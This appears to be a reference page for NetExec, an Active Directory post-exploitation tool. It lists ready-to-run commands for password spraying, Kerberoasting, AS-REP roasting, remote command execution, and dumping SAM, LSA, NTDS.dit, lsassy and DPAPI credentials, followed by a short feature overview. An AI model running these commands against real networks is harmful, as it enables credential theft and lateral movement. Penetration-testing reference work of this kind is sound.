Examples

Enumerate SMB hosts, OS versions, and sign-in status

netexec smb 10.10.10.0/24

RID brute force to enumerate domain users

netexec smb 10.10.10.1 -u guest -p '' --rid-brute

Enumerate password policy (null session)

netexec smb 10.10.10.1 -u '' -p '' --pass-pol

Enumerate active sessions on remote hosts

netexec smb 10.10.10.0/24 -u user -p pass --sessions

Enumerate domain users via SAMR

netexec smb 10.10.10.1 -u user -p pass --users

Enumerate domain groups

netexec smb 10.10.10.1 -u user -p pass --groups

Enumerate local groups on target

netexec smb 10.10.10.1 -u user -p pass --local-groups

Enumerate accessible SMB shares

netexec smb 10.10.10.1 -u user -p pass --shares

Enumerate disks via SMB

netexec smb 10.10.10.1 -u user -p pass --disks

List relay candidates (SMB signing disabled)

netexec smb 10.10.10.0/24 --gen-relay-list relay.txt

Enumerate logged-on users via SMB

netexec smb 10.10.10.0/24 -u user -p pass --loggedon-users

LDAP enumeration of domain users

netexec ldap 10.10.10.1 -u user -p pass --users

LDAP AS-REP roasting

netexec ldap 10.10.10.1 -u user -p pass --asreproast asrep.txt

LDAP Kerberoasting

netexec ldap 10.10.10.1 -u user -p pass --kerberoast kerb.txt

Find gMSA accounts

netexec ldap 10.10.10.1 -u user -p pass --gmsa

Find trusted-for-delegation accounts

netexec ldap 10.10.10.1 -u user -p pass --trusted-for-delegation

Password spray against SMB

netexec smb 10.10.10.0/24 -u users.txt -p 'Password123' --continue-on-success

SMB command execution (psexec-style)

netexec smb 10.10.10.1 -u user -p pass -x whoami

Enable WDigest on target

netexec smb 10.10.10.1 -u user -p pass -M wdigest

Dump SAM registry hives

netexec smb 10.10.10.1 -u admin -p pass --sam

Dump LSA secrets

netexec smb 10.10.10.1 -u admin -p pass --lsa

Dump NTDS.dit domain database

netexec smb 10.10.10.1 -u admin -p pass --ntds

Dump credentials with lsassy

netexec smb 10.10.10.1 -u admin -p pass -M lsassy

Extract DPAPI secrets/blobs

netexec smb 10.10.10.1 -u admin -p pass -M dpapi

Timeroasting — extract timestamp hashes from SMB

netexec smb 10.10.10.1 -u user -p pass -M timeroast

Coerce authentication via ms-efsr / coerce_plus

netexec smb 10.10.10.1 -u user -p pass -M coerce_plus

Change AD user password

netexec smb 10.10.10.1 -u admin -p pass -M change_password -o OLD_PASS=old NEW_PASS=new

Get user description fields (often contain passwords)

netexec smb 10.10.10.1 -u user -p pass -M get-desc-users

Find AS-REP roastable accounts with get_user_Password=notrequired

netexec smb 10.10.10.1 -u user -p pass -M get_user_Password -o PASSWORD=notrequired

Documentation

NetExec (nxc) — AD Post-Exploitation Framework

NetExec (formerly CrackMapExec, abbreviated nxc) is a swiss-army knife for Active Directory post-exploitation. It provides protocol-aware enumeration, credential spraying, automatic credential dumping, and lateral movement across SMB, LDAP, WinRM, and more.

Key Features

  • Protocol support: SMB, LDAP, WinRM, MSSQL
  • Module system: Extensible Python modules for custom attack logic
  • Authentication: Password, NTLM hash, Kerberos tickets
  • Output: Colored console, JSON, bloodhound-compatible formats

Common Protocols

Protocol Command Prefix Use Case
SMB nxc smb Share enumeration, RID brute, SAM/LSA/DPAPI dump, command exec
LDAP nxc ldap User enumeration, AS-REP roast, kerberoast, delegation
WinRM nxc winrm Remote command execution via WinRM
MSSQL nxc mssql SQL Server enumeration and query execution
